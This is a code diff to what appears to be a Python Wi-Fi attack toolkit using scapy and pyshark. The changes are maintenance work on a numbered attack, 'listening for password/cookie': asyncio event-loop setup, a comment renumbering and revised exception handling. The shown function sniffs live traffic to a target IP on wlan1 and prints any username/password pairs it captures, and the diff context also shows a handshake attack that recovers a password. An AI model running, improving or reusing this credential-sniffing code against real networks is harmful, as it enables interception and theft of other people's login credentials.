@@ -5,6 +5,7 @@ import time
 import shutil
 from scapy.all import *
 from scapy.layers.dot11 import *
+import asyncio
 
 
 def setup_network() -> None:
@@ -203,21 +204,19 @@ def handshake_attack(
     return password
 
 
-# Attack 10 - listening for password/cookie
+# Attack 9 - listening for password/cookie
 
 
 def packet_capture(target_ip: str):
     setup_network()
-    capture = pyshark.LiveCapture(interface="wlan1")
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    capture = pyshark.LiveCapture(interface="wlan1", eventloop=loop)
     seen = set()
 
     print("\n[*] Starting the packet sniffer")
     for packet in capture.sniff_continuously():
         try:
-            user_input = input().strip().lower()
-            if user_input == "s":
-                break
-
             if "ip" not in packet:
                 continue
             if packet["ip"].dst == target_ip:
@@ -239,7 +238,9 @@ def packet_capture(target_ip: str):
                             )
                             username, password = creds_string.split(":")
                             print("Found credential pair:", username, password)
-        except:
+        except KeyboardInterrupt:
+            break
+        except Exception:
             continue
     print("\n[*] Stopping the packet sniffer :(")
     teardown_network()
